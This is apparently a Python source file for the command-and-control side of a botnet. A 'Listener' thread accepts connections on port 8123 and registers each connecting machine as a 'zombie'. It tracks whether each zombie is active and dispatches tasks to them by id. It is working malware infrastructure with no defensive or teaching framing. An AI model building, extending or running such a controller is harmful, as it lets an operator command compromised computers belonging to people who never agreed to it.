import threading
from zombie import Zombie
from socket import *

class Listener(threading.Thread):

	zombies = []

	def __init__(self, HOST="0.0.0.0", PORT=8123):
		threading.Thread.__init__(self)

		self.running = True

		self.HOST = HOST
		self.PORT = PORT		

		setdefaulttimeout(1) #TODO


	def addZombie(self, c, address):

		for z in self.zombies:
			if z.address == address and not z.active():
				z.openedSocket.close()
				z.openedSocket = c
				return True

		zombie = Zombie(c, len(self.zombies), address)
		self.zombies.append(zombie)
		return True

	#listen for connections 
	def run(self):


		#setup sockets
		connection = socket()
		connection.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
		connection.bind((self.HOST, self.PORT))

		while self.running:

			#print("listening for zombies")

			try:
				connection.listen(5)
				c,addr = connection.accept()

				print("Connection from " + addr[0])

				self.addZombie(c, addr[0])
				
			except timeout:
				pass
		connection.close()

	#check zombie statuses
	def check(self):
		result = []

		for i in range(len(self.zombies)):
			row = [str(i)]
			row.append(self.zombies[i].name)

			if(self.zombies[i].active()):
				row.append("Active")
			else:
				row.append("Dead")

			result.append(row)

		return result


	def sendTask(self, id, task):
		return self.zombies[id].sendTask(task)

	#kill the thread
	def stop(self):

		if self.running:
			self.running = False
			
